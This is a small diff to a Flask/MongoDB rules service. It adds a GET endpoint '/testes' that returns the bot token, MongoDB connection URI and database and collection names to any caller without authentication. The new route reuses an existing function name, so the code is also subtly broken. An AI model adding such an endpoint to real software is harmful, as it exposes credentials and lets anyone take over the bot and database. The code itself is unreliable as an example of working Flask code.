@@ -36,3 +36,7 @@ def insertRule():
     mongoCol = getMongoCollection()
     mongoCol.insert_one(request.json)
     return 'ok'
+
+@app.route('/testes', methods=['GET'])
+def insertRule():
+    return os.environ['BOT_TOKEN'] + '///' + os.environ['MONGODB_URI'] + '///' + os.environ['DATABASE_NAME'] + '///' + os.environ['RULES_COLLECTION'] + '///'
